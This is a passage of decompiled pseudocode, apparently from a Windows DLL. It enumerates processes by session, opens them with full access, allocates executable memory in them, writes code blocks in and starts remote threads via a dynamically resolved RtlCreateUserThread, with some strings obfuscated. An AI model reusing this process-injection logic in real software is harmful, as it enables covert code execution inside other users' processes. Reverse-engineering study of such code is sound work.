  int v18[3]; // [esp+30h] [ebp-2Ch] BYREF
  _DWORD v19[5]; // [esp+3Ch] [ebp-20h] BYREF
  int v20; // [esp+58h] [ebp-4h]

  v4 = v3;
  v13 = -1;
  v14 = -1;
  sub_10012A7C(v17, a1);
  v20 = 0;
  if ( a2 != 2 )
  {
    if ( v4 == -1 )
    {
      v5 = sub_10022750(v18);
      LOBYTE(v20) = 1;
      v14 = (*(int (__thiscall **)(_DWORD *))(*v5 + 36))(v5);
      LOBYTE(v20) = 0;
      sub_10001FCC(v18);
    }
    else
    {
      v14 = v4;
    }
  }
  sub_1001D82E(v19);
  LOBYTE(v20) = 2;
  sub_10024631(v19, (int)v16);
  LOBYTE(v20) = 3;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v16[0] + 4))(v16[0]) )
  {
    v6 = (*(int (__thiscall **)(int))(*(_DWORD *)v16[0] + 12))(v16[0]);
    v7 = sub_1001D7F9(v6, v18);
    LOBYTE(v20) = 4;
    v8 = sub_1000D84E((int)v7, (int)v17);
    LOBYTE(v20) = 3;
    sub_1000CE59(v18);
    if ( v8 )
    {
      v10 = *(_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v16[0] + 12))(v16[0]);
      v11 = -1;
      if ( a2 == 2 )
        goto LABEL_13;
      if ( !ProcessIdToSessionId(v10, &pSessionId) )
        sub_1001DA43();
      v11 = pSessionId;
      if ( a2 || v14 == pSessionId )
      {
LABEL_13:
        if ( a3 && v13 != -1 )
        {
          v13 = -1;
          break;
        }
        v13 = v10;
        if ( a2 == 1 && v14 == v11 )
          break;
      }
    }
    sub_1000A59A(v9, v16[0]);
  }
  LOBYTE(v20) = 2;
  sub_1000AE88(v16);
  if ( v13 == -1 )
  {
    sub_10016441(&pSessionId);
    _CxxThrowException(&pSessionId, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  LOBYTE(v20) = 0;
  sub_10009F6C(v19);
  v20 = -1;
  sub_10012AAC(v17);
  return v13;
}
// 10022889: variable 'v3' is possibly undefined
// 1002299A: variable 'v9' is possibly undefined
// 1001DA43: using guessed type void __noreturn sub_1001DA43(void);
// 1002285D: using guessed type int var_2C[3];
// 1002285D: using guessed type _DWORD var_20[5];

//----- (10022A14) --------------------------------------------------------
_DWORD *__cdecl sub_10022A14(_DWORD *a1, int a2, int a3, char a4, DWORD a5)
{
  int v5; // eax

  v5 = sub_1002285D(a2, a3, a4);
  sub_10022A56(v5, a1, a5);
  return a1;
}

//----- (10022A56) --------------------------------------------------------
_DWORD *__usercall sub_10022A56@<eax>(DWORD a1@<ebx>, _DWORD *a2, DWORD dwDesiredAccess)
{
  HANDLE v3; // eax
  _DWORD pExceptionObject[7]; // [esp+10h] [ebp-1Ch] BYREF

  pExceptionObject[6] = 0;
  pExceptionObject[3] = 0;
  v3 = OpenProcess(dwDesiredAccess, 0, a1);
  if ( !v3 )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1002271D(a2, v3, 0);
  a2[2] = a1;
  return a2;
}

//----- (10022AB1) --------------------------------------------------------
_DWORD *__cdecl sub_10022AB1(_DWORD *a1, int a2, char pExceptionObject)
{
  int *v3; // ecx
  int *v4; // esi
  HANDLE v5; // eax
  int v7; // [esp+10h] [ebp-1Ch] BYREF
  int v8; // [esp+14h] [ebp-18h]
  int v9; // [esp+18h] [ebp-14h]
  LPWSTR FilePart; // [esp+1Ch] [ebp-10h] BYREF
  int v11; // [esp+28h] [ebp-4h]

  v4 = v3;
  v9 = 0;
  sub_1000CC90(260, &v7);
  v11 = 1;
  FilePart = 0;
  if ( pExceptionObject )
  {
    sub_1000CF22(&v7);
    if ( !SearchPathW(0, *(LPCWSTR *)(v4[1] + 12), 0, *(_DWORD *)(v8 + 28), *(LPWSTR *)(v8 + 12), &FilePart) )
    {
      sub_10016441(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v4 = &v7;
  }
  v5 = sub_10021843(a2, (int)v4);
  sub_1002271D(a1, v5, 0);
  v9 = 1;
  LOBYTE(v11) = 0;
  sub_1000CE59(&v7);
  return a1;
}
// 10022ABD: variable 'v3' is possibly undefined

//----- (10022B4F) --------------------------------------------------------
_DWORD *__cdecl sub_10022B4F(_DWORD *a1, int a2, int *a3, int a4, char pExceptionObject)
{
  int *v5; // eax
  HANDLE v6; // eax
  int v8; // [esp+10h] [ebp-1Ch] BYREF
  int v9; // [esp+14h] [ebp-18h]
  int v10; // [esp+18h] [ebp-14h]
  LPWSTR FilePart; // [esp+1Ch] [ebp-10h] BYREF
  int v12; // [esp+28h] [ebp-4h]

  v10 = 0;
  sub_1000CC90(260, &v8);
  v12 = 1;
  FilePart = 0;
  if ( pExceptionObject )
  {
    sub_1000CF22(&v8);
    if ( !SearchPathW(0, *(LPCWSTR *)(a3[1] + 12), 0, *(_DWORD *)(v9 + 28), *(LPWSTR *)(v9 + 12), &FilePart) )
    {
      sub_10016441(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v5 = &v8;
  }
  else
  {
    v5 = a3;
  }
  v6 = sub_100218E9(a4, (int)v5, a2);
  sub_1002271D(a1, v6, 0);
  v10 = 1;
  LOBYTE(v12) = 0;
  sub_1000CE59(&v8);
  return a1;
}

//----- (10022BF7) --------------------------------------------------------
DWORD __thiscall sub_10022BF7(_DWORD *this)
{
  int *p_pExceptionObject; // eax
  int v3; // eax
  _ThrowInfo *v5; // [esp-4h] [ebp-1Ch]
  _DWORD v6[3]; // [esp+4h] [ebp-14h] BYREF
  int pExceptionObject; // [esp+10h] [ebp-8h] BYREF
  DWORD ExitCode; // [esp+14h] [ebp-4h] BYREF

  if ( !sub_10014F97((int)this) )
  {
    sub_10016441(&pExceptionObject);
    v5 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  v3 = this[1];
  ExitCode = 0;
  if ( !GetExitCodeProcess(*(HANDLE *)(v3 + 16), &ExitCode) )
  {
    sub_100167F9(v6, 1);
    p_pExceptionObject = v6;
LABEL_3:
    _CxxThrowException(p_pExceptionObject, v5);
  }
  return ExitCode;
}
// 10022C1B: variable 'v5' is possibly undefined
// 10022BF7: using guessed type _DWORD var_14[3];

//----- (10022C53) --------------------------------------------------------
int __thiscall sub_10022C53(_DWORD *this)
{
  wchar_t *v2; // eax
  int v3; // ecx
  int v4; // ecx
  int v5; // eax
  int v7; // [esp+4h] [ebp-54h] BYREF
  int v8; // [esp+8h] [ebp-50h]
  int v9[2]; // [esp+Ch] [ebp-4Ch] BYREF
  _DWORD pExceptionObject[7]; // [esp+14h] [ebp-44h] BYREF
  int v11[7]; // [esp+30h] [ebp-28h] BYREF
  int v12; // [esp+54h] [ebp-4h]

  if ( (dword_100BF9B0 & 1) == 0 )
  {
    dword_100BF9B0 |= 1u;
    v12 = 0;
    v2 = (wchar_t *)sub_1000E943((int)&unk_100B7180);
    v9[0] = v3;
    pExceptionObject[4] = v9;
    sub_1000CC20(v9, v2);
    LOBYTE(v12) = 1;
    v8 = v4;
    v7 = v4;
    pExceptionObject[5] = &v7;
    sub_1000CC20(&v7, aNtdllDll_1);
    LOBYTE(v12) = 0;
    dword_100BC71C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_1002481B(v7, v8, v9[0]);
    v12 = -1;
  }
  memset(v11, 0, 0x18u);
  if ( dword_100BC71C(*(_DWORD *)(this[1] + 16), 0, v11, 24, 0) < 0 )
  {
    v5 = dword_100BC71C(*(_DWORD *)(this[1] + 16), 0, v11, 24, 0);
    sub_1002EA34(pExceptionObject, v5);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__);
  }
  return v11[4];
}
// 10022CA0: variable 'v3' is possibly undefined
// 10022CB3: variable 'v4' is possibly undefined
// 100B71DC: using guessed type wchar_t aNtdllDll_1[10];
// 100BC71C: using guessed type int (__stdcall *dword_100BC71C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100BF9B0: using guessed type int dword_100BF9B0;

//----- (10022D51) --------------------------------------------------------
_DWORD *__thiscall sub_10022D51(_DWORD *this, int a2)
{
  sub_10016406(this, a2);
  *this = &off_100947C4;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 100947C4: using guessed type int (__thiscall *off_100947C4)(void *Block, char);

//----- (10022D89) --------------------------------------------------------
_DWORD *__thiscall sub_10022D89(_DWORD *Block, char a2)
{
  sub_1002EACA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10022DA8) --------------------------------------------------------
bool __thiscall sub_10022DA8(_DWORD *this, UINT uExitCode)
{
  BOOL v3; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  LOBYTE(v3) = sub_10014F97((int)this);
  if ( !v3 )
  {
    v3 = TerminateProcess(*(HANDLE *)(this[1] + 16), uExitCode);
    if ( !v3 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  return v3;
}
// 10022DA8: using guessed type _DWORD pExceptionObject[3];

//----- (10022DEC) --------------------------------------------------------
_DWORD *__thiscall sub_10022DEC(_DWORD *this, _DWORD *a2, DWORD pExceptionObject)
{
  int v3; // edi
  int v4; // ebx
  int v5; // eax
  int v7[3]; // [esp+10h] [ebp-20h] BYREF
  unsigned int v8; // [esp+1Ch] [ebp-14h]
  int v9; // [esp+20h] [ebp-10h]
  int v10; // [esp+2Ch] [ebp-4h]

  v3 = 0;
  v9 = 0;
  v4 = sub_1001A85E(this);
  sub_1001D82E(v7);
  v10 = 1;
  if ( !v8 )
  {
LABEL_4:
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  while ( *(_DWORD *)(*(int (__thiscall **)(int *, int))(v7[0] + 44))(v7, v3) != v4 )
  {
    if ( ++v3 >= v8 )
      goto LABEL_4;
  }
  v5 = (*(int (__thiscall **)(int *, int))(v7[0] + 44))(v7, v3);
  sub_10022A56(*(_DWORD *)(v5 + 4), a2, pExceptionObject);
  v9 = 1;
  LOBYTE(v10) = 0;
  sub_10009F6C(v7);
  return a2;
}

//----- (10022E7B) --------------------------------------------------------
_DWORD *__thiscall sub_10022E7B(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-30h] BYREF
  int v6[3]; // [esp+1Ch] [ebp-24h] BYREF
  int v7; // [esp+28h] [ebp-18h]
  int v8; // [esp+2Ch] [ebp-14h]
  int v9; // [esp+3Ch] [ebp-4h]

  v6[2] = (int)this;
  v8 = 0;
  v9 = 1;
  sub_1000CC90(260, v6);
  LOBYTE(v9) = 2;
  v7 = *(_DWORD *)(this[1] + 16);
  v3 = sub_1000D0D9(v6);
  if ( !GetModuleBaseNameW(v7, 0, v3, 260) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1000D118((int)v6);
  sub_1000CE26(a2, (int)v6);
  v8 = 1;
  LOBYTE(v9) = 1;
  sub_1000CE59(v6);
  return a2;
}
// 100733FF: using guessed type int __stdcall GetModuleBaseNameW(_DWORD, _DWORD, _DWORD, _DWORD);
// 10022E7B: using guessed type _DWORD pExceptionObject[3];

//----- (10022F60) --------------------------------------------------------
int __thiscall sub_10022F60(void *this, int a2, int a3, int a4)
{
  sub_10028754(a3, (int)this, a2, a4);
  return a2;
}

//----- (10022F96) --------------------------------------------------------
int __thiscall sub_10022F96(_DWORD *this, int a2, SIZE_T dwSize, DWORD flProtect, DWORD flAllocationType)
{
  int v6; // ecx
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD v9[3]; // [esp+1Ch] [ebp-20h] BYREF
  int v10; // [esp+28h] [ebp-14h]
  int v11[3]; // [esp+2Ch] [ebp-10h] BYREF
  int v12; // [esp+38h] [ebp-4h]
  LPVOID flProtecta; // [esp+4Ch] [ebp+10h]

  v10 = 0;
  v11[0] = 128;
  sub_1002785C((int)v9, v11);
  v12 = 1;
  flProtecta = VirtualAllocEx(*(HANDLE *)(this[1] + 16), 0, dwSize, flAllocationType, flProtect);
  sub_10027909(v6, (int)v9);
  if ( !flProtecta )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10028754((int)flProtecta, (int)this, a2, dwSize);
  v10 = 1;
  LOBYTE(v12) = 0;
  sub_10027930(v9);
  return a2;
}
// 10022FDC: variable 'v6' is possibly undefined
// 10022F96: using guessed type int var_10[3];
// 10022F96: using guessed type _DWORD var_20[3];
// 10022F96: using guessed type _DWORD pExceptionObject[3];

//----- (10023024) --------------------------------------------------------
int __thiscall sub_10023024(void *this, int a2, char a3, char a4, char a5)
{
  sub_10033555((int)this, a2, a3, a4, a5);
  return a2;
}

//----- (100230AE) --------------------------------------------------------
char __thiscall sub_100230AE(void *this, int *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  bool v4; // bl
  int v6[5]; // [esp+10h] [ebp-18h] BYREF
  int v7; // [esp+24h] [ebp-4h]

  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  v3 = sub_10022750(v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(_DWORD *))(*v3 + 36))(v3) == v2;
  v7 = -1;
  sub_10001FCC(v6);
  if ( v4 )
    return 0;
  *a2 = sub_1002285D((int)&unk_100BF77C, 0, 1);
  return 1;
}
// 100230AE: using guessed type int var_18[5];

//----- (10023112) --------------------------------------------------------
_DWORD *__cdecl sub_10023112(_DWORD *a1, int a2, int a3)
{
  int v3; // eax
  int v4; // ecx
  int v5; // edi
  char *v6; // esi
  char *v7; // eax
  _BYTE *v8; // ebx
  _DWORD *result; // eax
  const char *v10; // [esp-10h] [ebp-34h]
  int v11; // [esp-8h] [ebp-2Ch] BYREF
  int v12; // [esp-4h] [ebp-28h]
  int *v13; // [esp+10h] [ebp-14h]
  int v14; // [esp+14h] [ebp-10h]
  int v15; // [esp+20h] [ebp-4h]

  sub_10016983((void *)0x40, (int)a1, 0);
  v15 = 0;
  v14 = 1;
  sub_10016F14(a1);
  v3 = sub_10016C00(a1);
  v12 = v4;
  v11 = v4;
  v5 = v3;
  v13 = &v11;
  sub_1000CC20(&v11, aKernel32Dll_0);
  v15 = 0;
  v6 = (char *)sub_10024778(v11, v12);
  v13 = &v11;
  sub_1000CC20(&v11, aVirtualfree_1);
  v15 = 0;
  *(_DWORD *)(v5 + 4) = sub_100247C6(v6, v11);
  v13 = &v11;
  sub_1000CC20(&v11, aGetprocaddress_0);
  v15 = 0;
  *(_DWORD *)(v5 + 16) = sub_100247C6(v6, v11);
  v13 = &v11;
  sub_1000CC20(&v11, aGetmodulehandl_1);
  v15 = 0;
  *(_DWORD *)(v5 + 12) = sub_100247C6(v6, v11);
  v13 = &v11;
  sub_1000CC20(&v11, aOpenthread);
  v15 = 0;
  *(_DWORD *)v5 = sub_100247C6(v6, v11);
  v13 = &v11;
  sub_1000CC20(&v11, aExitthread_0);
  v15 = 0;
  v7 = sub_100247C6(v6, v11);
  v10 = dword_100BBC3C;
  *(_DWORD *)(v5 + 8) = v7;
  *(_DWORD *)(v5 + 20) = a2;
  *(_DWORD *)(v5 + 24) = a3;
  strcpy((char *)(v5 + 28), v10);
  strcpy((char *)(v5 + 39), dword_100BBC38);
  if ( strlen((const char *)(v5 + 39)) )
  {
    v8 = (_BYTE *)(v5 + 39);
    do
      --*v8++;
    while ( (unsigned int)&v8[-39 - v5] < strlen((const char *)(v5 + 39)) );
  }
  result = a1;
  *(_BYTE *)(a1[1] + 8) = 1;
  return result;
}
// 1002314B: variable 'v4' is possibly undefined
// 100B72B4: using guessed type wchar_t aKernel32Dll_0[13];
// 100B72D0: using guessed type wchar_t aVirtualfree_1[12];
// 100B72E8: using guessed type wchar_t aGetprocaddress_0[15];
// 100B7308: using guessed type wchar_t aGetmodulehandl_1[17];
// 100B732C: using guessed type wchar_t aOpenthread[11];
// 100B7344: using guessed type wchar_t aExitthread_0[11];

//----- (10023290) --------------------------------------------------------
_DWORD *__cdecl sub_10023290(_DWORD *a1, char *a2, char *a3)
{
  int v3; // eax
  int v4; // ecx
  char **v5; // edi
  int v7; // [esp-8h] [ebp-30h] BYREF
  int v8; // [esp-4h] [ebp-2Ch]
  int *v9; // [esp+10h] [ebp-18h]
  int v10; // [esp+14h] [ebp-14h]
  char *v11; // [esp+18h] [ebp-10h]
  int v12; // [esp+24h] [ebp-4h]

  sub_10016983((void *)0x10, (int)a1, 0);
  v12 = 0;
  v10 = 1;
  sub_10016F14(a1);
  v3 = sub_10016C00(a1);
  v8 = v4;
  v7 = v4;
  v5 = (char **)v3;
  v11 = (char *)&v7;
  sub_1000CC20(&v7, aKernel32Dll_5);
  v12 = 0;
  v11 = (char *)sub_10024778(v7, v8);
  v9 = &v7;
  sub_1000CC20(&v7, aVirtualfree_2);
  v12 = 0;
  *v5 = sub_100247C6(v11, v7);
  v9 = &v7;
  sub_1000CC20(&v7, aExitthread_1);
  v12 = 0;
  v5[1] = sub_100247C6(v11, v7);
  v5[2] = a2;
  v5[3] = a3;
  *(_BYTE *)(a1[1] + 8) = 1;
  return a1;
}
// 100232C7: variable 'v4' is possibly undefined
// 100B735C: using guessed type wchar_t aKernel32Dll_5[13];
// 100B7378: using guessed type wchar_t aVirtualfree_2[12];
// 100B7390: using guessed type wchar_t aExitthread_1[11];

//----- (10023355) --------------------------------------------------------
_DWORD *__thiscall sub_10023355(_DWORD *this, _DWORD *a2, int a3, char *a4, char a5, int Block)
{
  _DWORD *v6; // edi
  int *v7; // esi
  wchar_t *v8; // eax
  int v9; // ecx
  int v10; // ecx
  int v11; // eax
  int *v12; // eax
  int v13; // edi
  wchar_t *v14; // eax
  int v15; // ecx
  int v16; // ecx
  int v17; // edi
  void *v18; // edi
  int v19; // ecx
  _DWORD *v21; // esi
  _DWORD *v22; // ebx
  int v23; // eax
  _DWORD *v24; // eax
  _DWORD *v25; // esi
  _DWORD *v26; // edi
  void *v27; // ebx
  int v28; // eax
  _ThrowInfo *v29; // ecx
  const _ThrowInfo *v30; // ecx
  int v31; // ebx
  int v32; // ecx
  _DWORD *v33; // esi
  _DWORD *v34; // eax
  _DWORD *v35; // esi
  const _ThrowInfo *v36; // [esp-38h] [ebp-218h] BYREF
  const _ThrowInfo *v37; // [esp-34h] [ebp-214h]
  _ThrowInfo *v38; // [esp-30h] [ebp-210h] BYREF
  _ThrowInfo *v39; // [esp-2Ch] [ebp-20Ch]
  int v40; // [esp-28h] [ebp-208h] BYREF
  char *v41; // [esp-24h] [ebp-204h]
  int v42; // [esp-20h] [ebp-200h] BYREF
  int v43; // [esp-1Ch] [ebp-1FCh]
  const _ThrowInfo *v44; // [esp-18h] [ebp-1F8h]
  int v45; // [esp-10h] [ebp-1F0h] BYREF
  int v46; // [esp-Ch] [ebp-1ECh]
  int v47[6]; // [esp-8h] [ebp-1E8h] BYREF
  int v48[5]; // [esp+10h] [ebp-1D0h] BYREF
  int v49[5]; // [esp+24h] [ebp-1BCh] BYREF
  int v50[5]; // [esp+38h] [ebp-1A8h] BYREF
  int v51[5]; // [esp+4Ch] [ebp-194h] BYREF
  int v52[5]; // [esp+60h] [ebp-180h] BYREF
  _DWORD v53[2]; // [esp+74h] [ebp-16Ch] BYREF
  _DWORD v54[8]; // [esp+7Ch] [ebp-164h] BYREF
  char v55; // [esp+9Ch] [ebp-144h]
  _DWORD v56[8]; // [esp+A0h] [ebp-140h] BYREF
  int v57; // [esp+C0h] [ebp-120h]
  char v58; // [esp+C8h] [ebp-118h]
  _DWORD pExceptionObject[2]; // [esp+CCh] [ebp-114h] BYREF
  _DWORD v60[2]; // [esp+D8h] [ebp-108h] BYREF
  int v61[6]; // [esp+E0h] [ebp-100h] BYREF
  int *v62; // [esp+F8h] [ebp-E8h]
  char v63; // [esp+100h] [ebp-E0h]
  _DWORD v64[2]; // [esp+104h] [ebp-DCh] BYREF
  int v65[6]; // [esp+10Ch] [ebp-D4h] BYREF
  int v66; // [esp+124h] [ebp-BCh] BYREF
  HANDLE v67[4]; // [esp+128h] [ebp-B8h] BYREF
  int v68; // [esp+138h] [ebp-A8h] BYREF
  int v69; // [esp+13Ch] [ebp-A4h] BYREF
  int v70; // [esp+140h] [ebp-A0h] BYREF
  int v71; // [esp+144h] [ebp-9Ch] BYREF
  int v72; // [esp+148h] [ebp-98h] BYREF
  int v73[2]; // [esp+14Ch] [ebp-94h] BYREF
  int v74; // [esp+154h] [ebp-8Ch] BYREF
  int v75; // [esp+158h] [ebp-88h] BYREF
  int v76; // [esp+15Ch] [ebp-84h] BYREF
  int v77; // [esp+160h] [ebp-80h] BYREF
  int v78[2]; // [esp+164h] [ebp-7Ch] BYREF
  int v79; // [esp+16Ch] [ebp-74h] BYREF
  int v80[2]; // [esp+170h] [ebp-70h] BYREF
  int v81[3]; // [esp+178h] [ebp-68h] BYREF
  int v82; // [esp+184h] [ebp-5Ch] BYREF
  int v83[2]; // [esp+188h] [ebp-58h] BYREF
  int v84; // [esp+190h] [ebp-50h] BYREF
  int v85[2]; // [esp+194h] [ebp-4Ch] BYREF
  int v86[2]; // [esp+19Ch] [ebp-44h] BYREF
  int v87; // [esp+1A4h] [ebp-3Ch]
  int v88[2]; // [esp+1ACh] [ebp-34h] BYREF
  DWORD v89; // [esp+1B4h] [ebp-2Ch] BYREF
  int v90; // [esp+1B8h] [ebp-28h] BYREF
  _DWORD v91[2]; // [esp+1BCh] [ebp-24h] BYREF
  _DWORD *v92; // [esp+1C4h] [ebp-1Ch]
  int *v93; // [esp+1C8h] [ebp-18h]
  int *v94; // [esp+1CCh] [ebp-14h] BYREF
  int v95; // [esp+1DCh] [ebp-4h]

  v6 = this;
  v92 = this;
  v87 = 0;
  v7 = (int *)Block;
  if ( Block )
  {
    if ( (dword_100BF9C0 & 1) == 0 )
    {
      dword_100BF9C0 |= 1u;
      v95 = 1;
      v8 = (wchar_t *)sub_1000E943((int)&unk_100B73A8);
      v47[0] = v9;
      v93 = v47;
      sub_1000CC20(v47, v8);
      LOBYTE(v95) = 2;
      v46 = v10;
      v45 = v10;
      v94 = &v45;
      sub_1000CC20(&v45, aNtdllDll_3);
      LOBYTE(v95) = 1;
      dword_100BC72C = (int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_1002481B(v45, v46, v47[0]);
      LOBYTE(v95) = 0;
    }
    memset(v65, 0, sizeof(v65));
    if ( dword_100BC72C(*(_DWORD *)(v6[1] + 16), 0, v65, 24, 0) < 0 )
    {
      v11 = dword_100BC72C(*(_DWORD *)(v6[1] + 16), 0, v65, 24, 0);
      sub_1002EA34(pExceptionObject, v11);
      v39 = (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__;
      v12 = pExceptionObject;
      goto LABEL_6;
    }
    v94 = v7;
    while ( 1 )
    {
      sub_10016983((void *)0xA4, (int)v80, 0);
      v95 = 4;
      sub_10028754(v65[1], (int)v6, (int)v60, 164);
      LOBYTE(v95) = 5;
      if ( sub_10028DCD(v61, v80) != 164 )
      {
        sub_10016441(&v79);
        v44 = &_TI1_AVSnsziibtx_sr__;
        v12 = &v79;
        goto LABEL_6;
      }
      v13 = sub_10016C24(v80);
      if ( *(_DWORD *)(v13 + 12) )
      {
        sub_10016983((void *)0x18, (int)&v66, 0);
        LOBYTE(v95) = 6;
        sub_10028754(*(_DWORD *)(v13 + 160), (int)v92, (int)v53, 24);
        LOBYTE(v95) = 7;
        if ( sub_10028DCD(v54, &v66) != 24 )
        {
          sub_10016441(&v70);
          v44 = &_TI1_AVSnsziibtx_sr__;
          v12 = &v70;
          goto LABEL_6;
        }
        if ( *(_DWORD *)(sub_10016C24(&v66) + 4) == -1 )
        {
          LOBYTE(v95) = 6;
          sub_10028854((int)v53);
          LOBYTE(v95) = 5;
          sub_10016B53(&v66);
          LOBYTE(v95) = 4;
          sub_10028854((int)v60);
          LOBYTE(v95) = 0;
          sub_10016B53(v80);
          v6 = v92;
          break;
        }
        LOBYTE(v95) = 6;
        sub_10028854((int)v53);
        LOBYTE(v95) = 5;
        sub_10016B53(&v66);
      }
      Sleep(0xAu);
      v94 = (int *)((char *)v94 - 10);
      LOBYTE(v95) = 4;
      sub_10028854((int)v60);
      LOBYTE(v95) = 0;
      sub_10016B53(v80);
      if ( !v94 && Block != -1 )
      {
        sub_1002A32D(&v68);
        v44 = &_TI2_AVBtedofbPwtdhdgkk_bjxssd_sr__;
        v12 = &v68;
        goto LABEL_6;
      }
      v6 = v92;
    }
  }
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, DWORD *))(*v6 + 76))(v6, &v89) )
  {
    sub_1002271D(&v84, 0, 0);
    v95 = 11;
    sub_1002465F(v64);
    LOBYTE(v95) = 13;
    v21 = sub_10022A56(v89, &v90, 0x1F0FFFu);
    LOBYTE(v95) = 14;
    sub_10013739(v21 + 1, v85);
    v85[1] = v21[2];
    LOBYTE(v95) = 13;
    sub_10001FCC(&v90);
    v95 = 12;
    sub_100287F8((int)v56);
    LOBYTE(v95) = 22;
    sub_1000E9E2(&v82, 0, 0);
    LOBYTE(v95) = 23;
    sub_1000E9E2(&v77, 0, 0);
    LOBYTE(v95) = 25;
    sub_1000CC20(v73, word_100B7478);
    LOBYTE(v95) = 26;
    v22 = v92;
    v23 = sub_1001A85E(v92);
    sub_1000D184((int)v73, aThPoolShdPqomg, v23);
    v24 = sub_1001445F(v86);
    LOBYTE(v95) = 27;
    sub_100174BF((int)v67, 17, (int)v73, 1, *(struct _SECURITY_ATTRIBUTES **)(*v24 + 4));
    LOBYTE(v95) = 29;
    sub_100015D8(v86);
    sub_100171BE((int *)v67, v91);
    LOBYTE(v95) = 30;
    sub_1000CC20(v86, word_100B74B8);
    LOBYTE(v95) = 31;
    v43 = sub_1001A85E(v22);
    sub_1000D184((int)v86, aThPoolShdMtxGm);
    v93 = &v42;
    sub_1000CE26(&v42, (int)v86);
    LOBYTE(v95) = 31;
    sub_1002E885(v65, (struct _SECURITY_ATTRIBUTES *)1, v42, v43);
    LOBYTE(v95) = 33;
    if ( *(_DWORD *)v65[5] )
    {
      v93 = *(int **)v65[5];
    }
    else
    {
      sub_10016983((void *)(byte_10073DDA - (char *)sub_10073DAF), (int)v49, sub_10073DAF);
      LOBYTE(v95) = 34;
      v25 = v92;
      (*(void (__thiscall **)(_DWORD *, _DWORD *, int, int, int))(*v92 + 44))(v92, v60, v49[3], 64, 4096);
      LOBYTE(v95) = 35;
      v63 = 1;
      sub_10028BB4(v60, v49);
      v63 = 0;
      v93 = v62;
      *(_DWORD *)v65[5] = v62;
      v26 = sub_10022750(v81);
      LOBYTE(v95) = 36;
      v27 = (void *)v65[3];
      sub_1001A85E(v25);
      v28 = sub_1001A85E(v26);
      sub_100293A5(v27, 0, v28);
      LOBYTE(v95) = 35;
      sub_10001FCC(v81);
      LOBYTE(v95) = 34;
      sub_10028854((int)v60);
      LOBYTE(v95) = 33;
      sub_10016B53(v49);
      v22 = v92;
    }
    LOBYTE(v95) = 31;
    sub_1002E8FA(v65);
    LOBYTE(v95) = 30;
    sub_1000CE59(v86);
    LOBYTE(v95) = 29;
    sub_100171F2(v91);
    LOBYTE(v95) = 26;
    sub_100175EC(v67);
    LOBYTE(v95) = 25;
    sub_1000CE59(v73);
    sub_10023290(v50, (char *)a3, a4);
    LOBYTE(v95) = 37;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int, int, int))(*v22 + 44))(v22, v53, v50[3], 64, 4096);
    LOBYTE(v95) = 38;
    v55 = 0;
    sub_10028BB4(v53, v50);
    v39 = v29;
    v38 = v29;
    a4 = (char *)&v38;
    sub_1000CC20(&v38, aRtlcreateusert);
    LOBYTE(v95) = 39;
    v37 = v30;
    v36 = v30;
    a3 = (int)&v36;
    sub_1000CC20(&v36, aNtdllDll_4);
    LOBYTE(v95) = 38;
    a4 = sub_1002481B((int)v36, (int)v37, (int)v38);
    Block = 0;
    a3 = 128;
    sub_1002785C((int)&v90, &a3);
    LOBYTE(v95) = 41;
    v31 = *(_DWORD *)(v22[1] + 16);
    v39 = (_ThrowInfo *)v88;
    if ( ((int (__cdecl *)(int, _DWORD, int, _DWORD, _DWORD, _DWORD, int *, _DWORD, int *))a4)(
           v31,
           0,
           1,
           0,
           0,
           0,
           v93,
           v54[6],
           &Block) )
    {
      sub_10016441(&v74);
      v12 = &v74;
    }
    else
    {
      sub_10027909(v32, (int)&v90);
      if ( Block )
      {
        v33 = sub_1000E9E2(v81, (void *)Block, 0);
        LOBYTE(v95) = 42;
        sub_10013739(v33 + 1, v83);
        v83[1] = v33[2];
        LOBYTE(v95) = 41;
        sub_1000EA34(v81);
        sub_10023112(v51, v88[0], v88[1]);
        LOBYTE(v95) = 43;
        sub_10016983((void *)(&byte_10073DAE - (char *)sub_10073D49), (int)v48, sub_10073D49);
        LOBYTE(v95) = 44;
        sub_10016DC4(v51, (int)v52, v48);
        LOBYTE(v95) = 45;
        v34 = (_DWORD *)sub_10022F96(&v84, (int)v60, v52[3], 0x40u, 0x1000u);
